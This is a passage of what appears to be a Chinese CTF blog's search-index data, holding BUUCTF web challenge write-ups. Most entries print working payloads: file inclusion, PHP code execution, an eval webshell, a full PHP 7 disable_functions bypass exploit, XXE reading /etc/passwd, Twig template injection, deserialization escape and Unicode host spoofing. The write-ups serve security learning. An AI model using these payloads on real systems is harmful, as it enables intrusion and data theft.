/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag\r可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gwctf-2019我有一个数据库"},{"categories":["CTF"],"content":"\r2021.03.01 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210301"},{"categories":["CTF"],"content":"\r[BJDCTF2020]ZJCTF，不过如此绕过 第一层用php伪协议中的data封装流。PHP伪协议总结 然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter payload text ?text=data://text/plain,I have a dream\u0026file=php://filter/convert.base64-encode/resource=next.php\r读出来的next.php text PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K\rbase64解码： text \u003c?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); } foreach($_GET as $re =\u003e $str) { echo complex($re, $str). \"\\n\"; } function getFlag(){ @eval($_GET['cmd']); }\r这里想要通过需要知道一个深入研究 preg_replace /e 模式下的代码漏洞问题 最终payload text next.php?\\S*=${getFlag()}\u0026cmd=system('cat /flag');\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020zjctf不过如此"},{"categories":["CTF"],"content":"\r[De1CTF 2019]SSRF Me进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码 python #! /usr/bin/env python # encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if (not os.path.exists(self.sandbox)): # SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) # 此处是文件读取得注入点 if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False # generate Sign For Action Scan. @app.route(\"/geneSign\", methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param) @app.route('/De1ta', methods=['GET', 'POST']) def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if (waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(\"code.txt\", \"r\").read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\" def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check = param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0')\r简单说明思路： 请求部分(代码69-78)： 获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参 读取文件需要在cookie里传入参数action、sign action是执行类型，代码33行和43行指出了两种。 sing是用来验证param和action的，相关函数在94行，稍后做解释 获取sign部分(61-66) 获取param，action固定为scan 返回(secert_key + param + action)组合的sign 所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。 假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用|仅为说明使用，其实字符串是相连的) text secert_key|flag.txt|scan\r但是我们想要使用read，可以构造param为flag.txtread text secert_key|flag.txtread|scan\r再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。 text secert_key|flag.txt|readscan\r请求/geneSign text /geneSign?param=flag.txtread\r得到 text 9017a8826b7267833f22c0f22d90fea7\r得到sign以后，再去访问/De1ta text /De1ta?param=flag.txt sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;\r获得flag ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#de1ctf-2019ssrf-me"},{"categories":["CTF"],"content":"\r[网鼎杯 2020 朱雀组]phpweb看源码，有一个表单和自动提交的js。表单参数为 text func=date\u0026p=Y-m-d+h%3Ai%3As+a\r是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php text \u003c?php $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") { return $result; } else {return \"\";} } class Test { var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() { if ($this-\u003efunc != \"\") { echo gettime($this-\u003efunc, $this-\u003ep); } } } $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\"Hacker...\"); } } ?\u003e\r我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。 先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下 text \u003c?php class Test { var $p = \"ls ../../../../\"; var $func = \"system\"; } $s=new Test(); echo urlencode(serialize($s)); #unserialize O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\rwp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93 text POST func=unserialize\u0026p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\r最后读文件 text func=readfile\u0026p=../../../../tmp/flagoefiu4r93\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#网鼎杯-2020-朱雀组phpweb"},{"categories":["CTF"],"content":"\r[GKCTF2020]CheckIN是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以 text phpinfo(); cGhwaW5mbygpOw==\r查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数 可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。 scandir根目录查看 text ?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7\r又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件 传码 text eval($_POST[1]); ZXZhbCgkX1BPU1RbMV0pOw==\r蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道RCE ME也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)： text \u003c?php # PHP 7.0-7.3 disable_functions bypass PoC (*nix only) # # Bug: https://bugs.php.net/bug.php?id=72530 # # This exploit should work on all PHP 7.0-7.3 versions # # Author: https://github.com/mm0r1 pwn(\"../../.././readflag\"); #这里是想要执行的命令 function pwn($cmd) { global $abc, $helper; function str2ptr(\u0026$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u003e= 0; $j--) { $address \u003c\u003c= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \"\"; for ($i=0; $i \u003c $m; $i++) { $out .= chr($ptr \u0026 0xff); $ptr \u003e\u003e= 8; } return $out; } function write(\u0026$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u003c $n; $i++) { $str[$p + $i] = chr($v \u0026 0xff); $v \u003e\u003e= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u003ea); if($s != 8) { $leak %= 2 \u003c\u003c ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u003c $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026\u0026 $p_flags == 6) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026\u0026 $p_flags == 5) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u003c $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026 0xfffffffffffff000; for($i = 0; $i \u003c 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { # ELF header return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { # system return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } class ryat { var $ryat; var $chtg; function __destruct() { $this-\u003echtg = $this-\u003eryat; $this-\u003eryat = 1; } } class Helper { public $a, $b, $c, $d; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if you get segfaults $contiguous = []; for($i = 0; $i \u003c $n_alloc; $i++) $contiguous[] = str_repeat('A', 79); $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}'; $out = unserialize($poc); gc_collect_cycles(); $v = []; $v[0] = ptr2str(0, 79); unset($v); $abc = $out[2][0]; $helper = new Helper; $helper-\u003eb = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gkctf2020checkin"},{"categories":["CTF"],"content":"\r03.02 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#0302"},{"categories":["CTF"],"content":"\r[NCTF2019]Fake XML cookbook根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。 使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目 text POST Content-Type: application/xml; \u003cuser\u003e\u003cusername\u003e1\u003c/username\u003e\u003cpassword\u003e2\u003c/password\u003e\u003c/user\u003e\r去摸一个payload试试 text \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY admin SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cuser\u003e\u003cusername\u003e\u0026admin;\u003c/username\u003e\u003cpassword\u003e123456\u003c/password\u003e\u003c/user\u003e\r成功读取文件 把路径改为/flag，获得flag ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#nctf2019fake-xml-cookbook"},{"categories":["CTF"],"content":"\r[ASIS 2019]Unicorn shop这道题绝活。学到了unicode的安全问题：浅谈Unicode设计的安全性，看了wp。 进入网站一个本杰明·富兰克林至理名言： 金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多 差点信了，我就要赚钱花(小声bb) 下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示 ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。 一个和unicode有关的网站：https://www.compart.com/en/unicode 网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：Ctrl+F搜索thousand，找1377以上的都可。 我选的是这个፼数值是1w，直接传传不过去，使用url编码一次再传。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#asis-2019unicorn-shop"},{"categories":["CTF"],"content":"\r[BJDCTF2020]Cookie is so stable 这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有 Why not take a closer look at cookies? 去flag.php提交个1之后，看cookie为 text Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1\r一目了然，接下来就是找payload。再使用之前的 text {system('cat /flag')}\r被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload text {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}}\r我是受了这位师傅的文章启发，又去结合了下这道题的源码才搞明白。 这道题在渲染之前使用了twig模板： Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。 我同样在题目的源码中找到了render()方法和Twig_Environment配置信息 然后payload的具体原理在的Environment.php中,贴一下和payload相关部分： 先执行{{_self.env.registerUndefinedFilterCallback(\"exec\")}}调用了registerUndefinedFilterCallback()函数(图中884行)，注册了一个未定义的函数到filterCallbacks全局变量中 接着执行{{_self.env.getFilter(\"whoami\")}}调用了getFilter()函数，并传入变量$name值为执行的命令，当函数执行到图中代码875行时，进入循环执行了call_user_func()，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的filterCallbacks全局变量，里边已经躺好了一个刚刚注册的exec，至此就形成了payload ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020cookie-is-so-stable"},{"categories":["CTF"],"content":"\r小彩蛋现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了 挺草的记一下。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#小彩蛋"},{"categories":["CTF"],"content":"\r[CISCN 2019 初赛]Love Math源码： php \u003c?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) \u003e= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); }\r快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。 刷题记录：[CISCN 2019 初赛]Love Math 最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。 利用$whitelist里的函数名称和数字遍历异或^，Fuzz找出来需要的字母，然后拼接一个_GET传参执行命令。 Fuzz的代码 php \u003c?php $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; $exp=''; for ($i=0; $i \u003c count($whitelist); $i++) { for ($j=0; $j \u003c 1000; $j++) { $exp=$whitelist[$i]^$j.\"\"; echo $whitelist[$i].\"^\".$j.\"----\".$exp; echo \"\\n\"; } }\r需要知道的有，php某个版本以后可以使用函数名加()的方式调用函数，如 php \u003c?php echo base_convert(\"strtoupper\", 36, 10); $cos=base_convert(\"2927671435926243\", 10, 36); echo \"\\n\".$cos(\"abc\");\r上面代码是把字符串strtoupper赋值到变量$cos，然后直接使用$cos()执行strtoupper()函数。代码中使用base_convert函数也是这道题的一种思路哦。﹙ˊ_\u003eˋ﹚ 还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号()括起来就可以了。$如果直接拼接到字符串上也是不可以的，需要使用形如$$cos才可以正确的指向变量。 最终payload： php ?c=$cos=(is_finite^(6).(4)).(rad2deg^(7).(5));$cos=$$cos;$cos{0}($cos{1})\u00260=system\u00261=cat /flag\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#ciscn-2019-初赛love-math"},{"categories":["CTF"],"content":"\r[0CTF 2016]piapiapia使用目录扫描发现了www.zip网站备份。 网站结构 static upload class.php config.php index.php profile.php register.php update.php 发现有register就去注册个试试呗 注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号 邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是： html \u003cimg src=\"data:image/gif;base64,.......\r查看源码profile.php中是这样的 php $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));\r读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了unserialize，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地 php \u003c?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = ''; ?\u003e 下载的源码肯定不会把flag直接给你，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：filter php $username = parent::filter($username); $password = parent::filter($password);\r跟进一下 php public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); }\r过滤_，select、insert、update、delete、where会被替换成hacker，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用PHP反序列化字符串逃逸，序列化的结尾是\";}可以手动构造闭合。 现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工 先上payload code wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\r⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。 受到了这位师傅的博客[0CTF 2016]piapiapia，我尝试了下$profile属性其实是一个关联数组，是键值对形式的，并且字符串可能是嵌套起来的，形如 php \u003c?php class profile{ public $file = 'a:2:{s:8:\"nickname\";s:5:\"where\";s:5:\"photo\";s:3:\"233\";}'; public $upload =\"2333\"; } $s1= new profile(); echo serialize($s1);\r结果是 php O:7:\"profile\":2:{s:4:\"file\";s:56:\"a:2:{s:8:\"nickname\";s:15:\"where\";s:5:\"photo\";s:3:\"233\";}\";s:6:\"upload\";s:4:\"2333\";}\r这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。 报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。 查看页面的图片内容 base64解码 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#0ctf-2016piapiapia"},{"categories":["CTF"],"content":"\r[SUCTF 2019]Pythonginx 整理一下源码 python def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\"\r三个if都是判断host == 'suctf.cc'，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断==，回过头来注意到了第二个if中有newhost.append(h.encode('idna').decode('utf-8'))进行了一波编码，那么问题就出在了这里。 所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母c，那么我就找第一个字母s验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，需要多试几个。 我选出的是这个字符𝐬，我们先使用url编码一下防止参数出现错误，尝试读一下passwd： code /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd\rflag并不在其中，并且也不再根目录下，根据题目中有nginx应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到： 配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 读配置文件 code /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf\r读flag text /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag\r参考的博客链接： https://www.xmsec.cc/suctf19-wp/ https://xz.aliyun.com/t/6042#toc-24 https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#suctf-2019pythonginx"},{"categories":["CTF"],"content":"\r[BSidesCF 2020]Had a bad day看这个标题我推一下OWRLD ORDER的Have a nice day 页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为 url /index.php?category=woofers\r尝试输入flag会显示 只能有woofers和meowers可以通过，尝试了下php的filter伪协议读文件 读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用： html 